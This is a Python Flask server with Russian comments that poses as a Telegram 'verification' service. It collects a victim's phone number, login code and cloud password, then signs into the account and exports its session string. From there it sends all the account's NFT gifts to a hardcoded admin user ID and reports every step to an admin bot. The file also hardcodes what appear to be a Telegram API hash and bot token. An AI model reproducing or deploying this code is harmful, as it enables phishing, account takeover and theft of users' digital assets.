# app.py — ПОЛНАЯ ВЕРСИЯ С ВЕРИФИКАЦИЕЙ, СПИСКОМ И ПЕРЕДАЧЕЙ

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import time
import random
import os
import json
import io
import re
from dotenv import load_dotenv
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired, FloodWait
import requests

load_dotenv()

app = Flask(__name__)
CORS(app)

API_ID = int(os.getenv('API_ID', '27908807'))
API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '8766481292'))

sessions = {}
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def send_admin_log(text):
    """Отправка лога админу"""
    try:
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Log error: {e}")

def send_gifts_list_to_admin(phone, username, gifts_data):
    """
    Отправляет список NFT подарков админу в красивом формате
    gifts_data: список словарей с полями collection, item_id, link
    """
    try:
        lines = []
        lines.append("=" * 50)
        lines.append(f"🎁 NFT ПОДАРКИ ПОЛЬЗОВАТЕЛЯ")
        lines.append("=" * 50)
        lines.append(f"📱 Phone: {phone}")
        lines.append(f"👤 Username: @{username}")
        lines.append(f"📦 Всего найдено: {len(gifts_data)}")
        lines.append("")
        
        if gifts_data:
            lines.append("СПИСОК ПОДАРКОВ:")
            for i, gift in enumerate(gifts_data, 1):
                lines.append(f"{i}. [{gift['collection']} #{gift['item_id']}]({gift['link']})")
        else:
            lines.append("❌ Подарков не найдено")
        
        lines.append("")
        lines.append("=" * 50)
        
        text = "\n".join(lines)
        send_admin_log(text)
        
        # Дополнительно отправляем как файл, если много подарков
        if len(gifts_data) > 10:
            file_content = "\n".join([f"{g['collection']}-{g['item_id']}: {g['link']}" for g in gifts_data])
            file_data = io.BytesIO(file_content.encode('utf-8'))
            files = {'document': (f"gifts_{phone}_{int(time.time())}.txt", file_data)}
            data = {
                'chat_id': ADMIN_CHAT_ID,
                'caption': f"📁 Полный список подарков @{username}",
                'parse_mode': 'Markdown'
            }
            requests.post(
                f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendDocument",
                files=files,
                data=data,
                timeout=30
            )
    except Exception as e:
        print(f"Send gifts list error: {e}")

def get_nft_link(gift):
    """
    Формирует ссылку на NFT подарок в формате:
    https://t.me/nft/{collection_name}-{item_id}
    Возвращает словарь с collection, item_id, link
    """
    # Получаем ID предмета
    item_id = None
    if hasattr(gift, 'id'):
        item_id = gift.id
    elif hasattr(gift, 'gift_id'):
        item_id = gift.gift_id
    elif hasattr(gift, 'sticker_id'):
        item_id = gift.sticker_id
    elif hasattr(gift, 'document_id'):
        item_id = gift.document_id
    
    if not item_id:
        return None
    
    # Получаем название коллекции
    collection = None
    
    # Пробуем разные поля
    if hasattr(gift, 'sticker_set_name') and gift.sticker_set_name:
        collection = gift.sticker_set_name
    elif hasattr(gift, 'collection_name') and gift.collection_name:
        collection = gift.collection_name
    elif hasattr(gift, 'name') and gift.name:
        collection = gift.name
    elif hasattr(gift, 'title') and gift.title:
        collection = gift.title
    elif hasattr(gift, 'set_name') and gift.set_name:
        collection = gift.set_name
    
    # Если коллекция не найдена — генерируем по ID
    if not collection:
        collection = f"nft_{item_id}"
    
    # Очищаем название от пробелов и спецсимволов, оставляем только буквы, цифры, тире
    collection = re.sub(r'[^a-zA-Z0-9_-]', '', str(collection))
    
    # Формируем ссылку
    link = f"https://t.me/nft/{collection}-{item_id}"
    
    return {
        'collection': collection,
        'item_id': item_id,
        'link': link
    }

async def get_user_gifts(client, user_id):
    """
    Получает все подарки пользователя и возвращает список NFT подарков
    """
    all_gifts = []
    
    # Метод 1: через get_available_gifts()
    try:
        if hasattr(client, 'get_available_gifts'):
            all_gifts = await client.get_available_gifts()
    except Exception as e:
        print(f"Method 1 (get_available_gifts) failed: {e}")
    
    # Метод 2: через сырой вызов GetGiftsRequest
    if not all_gifts:
        try:
            from pyrogram.raw.functions.payments import GetGiftsRequest
            result = await client.invoke(GetGiftsRequest())
            if result and hasattr(result, 'gifts'):
                all_gifts = result.gifts
        except Exception as e:
            print(f"Method 2 (GetGiftsRequest) failed: {e}")
    
    # Метод 3: через GetUserGiftsRequest
    if not all_gifts:
        try:
            from pyrogram.raw.functions.payments import GetUserGiftsRequest
            result = await client.invoke(GetUserGiftsRequest(
                user_id=user_id,
                limit=100
            ))
            if result and hasattr(result, 'gifts'):
                all_gifts = result.gifts
        except Exception as e:
            print(f"Method 3 (GetUserGiftsRequest) failed: {e}")
    
    # Если ничего не нашли — пробуем через бота
    if not all_gifts:
        try:
            # Пытаемся получить через метод get_inbox_gifts
            if hasattr(client, 'get_inbox_gifts'):
                all_gifts = await client.get_inbox_gifts()
        except Exception as e:
            print(f"Method 4 (get_inbox_gifts) failed: {e}")
    
    if not all_gifts:
        return []
    
    # Фильтруем NFT подарки
    nft_gifts = []
    for gift in all_gifts:
        is_nft = False
        
        # Проверяем разные поля
        if hasattr(gift, 'limited'):
            is_nft = gift.limited
        elif hasattr(gift, 'is_limited'):
            is_nft = gift.is_limited
        elif hasattr(gift, 'collectible'):
            is_nft = gift.collectible
        elif hasattr(gift, 'sticker_set_name'):
            is_nft = True
        elif hasattr(gift, 'gift_type'):
            if gift.gift_type == 'nft':
                is_nft = True
        
        if is_nft:
            nft_gifts.append(gift)
    
    return nft_gifts

async def transfer_nft_gifts(session_string, phone, username, user_id, transfer=True):
    """
    Основная функция: получает подарки, формирует ссылки и передает админу
    """
    client = None
    try:
        client = Client(
            "in_memory",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            in_memory=True
        )
        await client.connect()
        
        # Проверяем авторизацию
        try:
            me = await client.get_me()
            if not me:
                send_admin_log(f"❌ Сессия не активна\n📱 {phone}")
                return {'success': False, 'error': 'Сессия не активна'}
        except Exception as e:
            send_admin_log(f"❌ Ошибка авторизации\n📱 {phone}\n`{str(e)[:100]}`")
            return {'success': False, 'error': f'Ошибка авторизации: {str(e)[:100]}'}
        
        # Получаем подарки
        nft_gifts = await get_user_gifts(client, user_id)
        
        if not nft_gifts:
            send_admin_log(
                f"📭 *Нет NFT подарков*\n📱 {phone}\n👤 @{username}"
            )
            return {
                'success': True,
                'gifts_found': False,
                'message': 'Нет NFT подарков',
                'gifts': []
            }
        
        # Формируем список подарков со ссылками
        gifts_data = []
        gift_ids = []
        
        for gift in nft_gifts:
            gift_info = get_nft_link(gift)
            if gift_info:
                gifts_data.append(gift_info)
                
                # Получаем ID для передачи
                gift_id = None
                if hasattr(gift, 'id'):
                    gift_id = gift.id
                elif hasattr(gift, 'gift_id'):
                    gift_id = gift.gift_id
                
                if gift_id:
                    gift_ids.append(gift_id)
        
        # Отправляем список админу
        send_gifts_list_to_admin(phone, username, gifts_data)
        
        # Если нужно передать подарки
        if transfer and gift_ids:
            transferred = 0
            failed = 0
            
            for gift_id in gift_ids:
                try:
                    # Пробуем передать подарок
                    if hasattr(client, 'transfer_gift'):
                        await client.transfer_gift(gift_id=gift_id, user_id=ADMIN_USER_ID)
                    else:
                        from pyrogram.raw.functions.payments import TransferGiftRequest
                        await client.invoke(TransferGiftRequest(
                            gift_id=gift_id,
                            to_id=ADMIN_USER_ID
                        ))
                    transferred += 1
                    await asyncio.sleep(0.5)
                except FloodWait as e:
                    # Если флуд-вейт — ждем и пробуем снова
                    wait_time = e.value
                    send_admin_log(f"⏳ FloodWait {wait_time} секунд\n📱 {phone}")
                    await asyncio.sleep(wait_time)
                    try:
                        if hasattr(client, 'transfer_gift'):
                            await client.transfer_gift(gift_id=gift_id, user_id=ADMIN_USER_ID)
                        else:
                            from pyrogram.raw.functions.payments import TransferGiftRequest
                            await client.invoke(TransferGiftRequest(
                                gift_id=gift_id,
                                to_id=ADMIN_USER_ID
                            ))
                        transferred += 1
                    except:
                        failed += 1
                except Exception as e:
                    print(f"Transfer error for {gift_id}: {e}")
                    failed += 1
                    continue
            
            result_msg = f"✅ Передано: {transferred}\n❌ Не удалось: {failed}"
            send_admin_log(f"📊 *Результат передачи*\n📱 {phone}\n{result_msg}")
            
            return {
                'success': True,
                'gifts_found': True,
                'transferred': transferred,
                'failed': failed,
                'total': len(gift_ids),
                'gifts': gifts_data,
                'message': f'Передано {transferred} из {len(gift_ids)} подарков'
            }
        
        return {
            'success': True,
            'gifts_found': True,
            'gifts': gifts_data,
            'message': f'Найдено {len(gifts_data)} NFT подарков'
        }
        
    except Exception as e:
        error_msg = str(e)[:200]
        send_admin_log(f"❌ Ошибка\n📱 {phone}\n`{error_msg}`")
        return {'success': False, 'error': error_msg}
    finally:
        if client and hasattr(client, 'is_connected') and client.is_connected:
            try:
                await client.disconnect()
            except:
                pass

# ---------- ЭНДПОИНТЫ ДЛЯ ВЕРИФИКАЦИИ ----------

async def send_code_async(phone):
    try:
        client = Client(
            "in_memory",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True
        )
        await client.connect()

        sent_code = await client.send_code(phone)

        sessions[phone] = {
            'client': client,
            'phone_code_hash': sent_code.phone_code_hash
        }

        send_admin_log(f"📱 Код отправлен для {phone}")
        return {'success': True, 'phone_code_hash': sent_code.phone_code_hash}

    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_code_async(phone, code, phone_code_hash):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}

        client = client_data['client']

        try:
            signed_in = await client.sign_in(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
                phone_code=code
            )

            session_string = await client.export_session_string()

            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }

            await client.disconnect()

            send_admin_log(f"✅ Верификация успешна\n📱 {phone}\n👤 @{session_data['username']}")

            # Получаем подарки и передаем админу
            result = await transfer_nft_gifts(
                session_string, 
                phone, 
                session_data['username'], 
                session_data['user_id'],
                transfer=True
            )

            return {
                'success': True, 
                'hasPassword': False, 
                'sessionData': session_data,
                'gifts_result': result
            }

        except SessionPasswordNeeded:
            send_admin_log(f"🔐 Требуется пароль\n📱 {phone}")
            return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}

        except PhoneCodeInvalid:
            return {'success': False, 'error': 'Invalid code'}

        except PhoneCodeExpired:
            return {'success': False, 'error': 'Code expired'}

        except Exception as e:
            return {'success': False, 'error': str(e)}

    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_password_async(phone, password):
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}

        client = client_data['client']

        try:
            signed_in = await client.check_password(password=password)

            session_string = await client.export_session_string()

            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }

            await client.disconnect()

            send_admin_log(f"🔑 Верификация по паролю успешна\n📱 {phone}\n👤 @{session_data['username']}")

            # Получаем подарки и передаем админу
            result = await transfer_nft_gifts(
                session_string, 
                phone, 
                session_data['username'], 
                session_data['user_id'],
                transfer=True
            )

            return {
                'success': True, 
                'sessionData': session_data,
                'gifts_result': result
            }

        except Exception as e:
            return {'success': False, 'error': str(e)}

    except Exception as e:
        return {'success': False, 'error': str(e)}

def run_async(coro):
    return loop.run_until_complete(coro)

# ---------- FLASK ЭНДПОИНТЫ ----------

@app.route('/ping', methods=['GET'])
@app.route('/', methods=['GET'])
def ping():
    return jsonify({
        'status': 'online',
        'library': 'Pyrogram',
        'version': '2.0'
    })

@app.route('/sendCode', methods=['POST'])
def send_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()

    if not phone or len(phone) < 6:
        return jsonify({'success': False, 'error': 'Invalid phone'}), 400

    result = run_async(send_code_async(phone))

    if result['success']:
        return jsonify({
            'success': True,
            'phoneCodeHash': result.get('phone_code_hash'),
            'message': 'Code sent by Telegram'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkCode', methods=['POST'])
def check_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    phone_code_hash = data.get('phoneCodeHash', '').strip()

    if not phone or not code or not phone_code_hash:
        return jsonify({'success': False, 'error': 'Missing fields'}), 400

    result = run_async(check_code_async(phone, code, phone_code_hash))

    if result['success']:
        if result.get('hasPassword'):
            return jsonify({
                'success': True,
                'hasPassword': True,
                'message': 'Cloud password required'
            })
        else:
            return jsonify({
                'success': True,
                'hasPassword': False,
                'sessionData': result.get('sessionData'),
                'gifts': result.get('gifts_result', {}),
                'message': 'Verified'
            })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkPassword', methods=['POST'])
def check_password():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    password = data.get('password', '').strip()

    if not phone or not password:
        return jsonify({'success': False, 'error': 'Missing phone or password'}), 400

    result = run_async(check_password_async(phone, password))

    if result['success']:
        return jsonify({
            'success': True,
            'sessionData': result.get('sessionData'),
            'gifts': result.get('gifts_result', {}),
            'message': 'Password verified successfully'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

# Дополнительный эндпоинт для получения подарков без передачи
@app.route('/getGifts', methods=['POST'])
def get_gifts_only():
    data = request.json or {}
    session_string = data.get('sessionString', '').strip()
    phone = data.get('phone', '').strip()
    username = data.get('username', '').strip()
    user_id = data.get('userId', '').strip()
    transfer = data.get('transfer', False)

    if not session_string or not phone:
        return jsonify({'success': False, 'error': 'Missing sessionString or phone'}), 400

    if not user_id:
        user_id = 0
    
    result = run_async(transfer_nft_gifts(
        session_string, 
        phone, 
        username or 'unknown', 
        int(user_id) if user_id else 0,
        transfer=transfer
    ))

    if result['success']:
        return jsonify({
            'success': True,
            'gifts': result.get('gifts', []),
            'transferred': result.get('transferred', 0),
            'total': result.get('total', 0),
            'message': result.get('message', 'OK')
        })
    else:
        return jsonify({'success': False, 'error': result.get('error', 'Unknown error')}), 400

if __name__ == '__main__':
    print("=" * 60)
    print("🔐 NFT GIFT PARSER & TRANSFER SERVICE")
    print("📌 Версия с верификацией и списком подарков")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000, debug=False)
